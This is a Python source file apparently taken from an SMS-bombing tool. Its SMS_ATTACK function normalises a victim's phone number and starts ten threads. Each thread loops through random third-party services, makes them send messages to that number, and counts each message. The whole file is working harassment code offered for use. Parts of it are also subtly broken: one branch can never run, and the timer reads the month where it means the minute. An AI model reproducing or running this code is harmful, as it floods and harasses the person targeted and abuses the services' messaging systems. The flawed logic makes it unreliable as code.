import time
import SMS.sendRequest as request
import SMS.numberTools as number
import SMS.randomData  as randomData
from threading import Thread

import config



def SMS_ATTACK(id,phone):
    try:
        global FINISH
        FINISH = False
        threads_list = []

        services = request.getServices()
        phone = number.normalize(phone)


        def sms_flood():

            if config.type_spam[id] == 2:
                while True:
                    if config.stop_spam[id] == True:
                        break

                    service = randomData.random_service(services)
                    service = request.Service(service)
                    service.sendMessage(phone)
                    config.add_mess_db(id)
                    config.quantity_send_message[id] += 1
                    time.sleep(1)

            elif config.type_spam[id] == 1:
                if config.type_spam[id] == 2:
                    while True:
                        if config.stop_spam[id] == True:
                            break

                        service = randomData.random_service(services)
                        service = request.Service(service)
                        service.sendMessage(phone)
                        config.add_mess_db(id)
                        config.quantity_send_message[id] += 1
                        time.sleep(1.5)
            else:
                start_time = int(time.strftime("%m"))
                if start_time + 10 > 60:
                    end_time = start_time + 10 - 60
                else:
                    end_time = start_time + 10

                if config.type_spam[id] == 2:
                    while True:
                        if config.stop_spam[id] == True:
                            break

                        if int(time.strftime("%m")) >= end_time:
                            break

                        service = randomData.random_service(services)
                        service = request.Service(service)
                        service.sendMessage(phone)
                        config.add_mess_db(id)
                        config.quantity_send_message[id] += 1
                        time.sleep(3)

        for thread in range(10):
            print("[#] Staring thread " + str(thread))
            t = Thread(target=sms_flood)
            t.start()
            threads_list.append(t)


        for thread in threads_list:
            FINISH = True
            thread.join()

        print("!Attack stopped!")
    except Exception as e:
        print(repr(e))
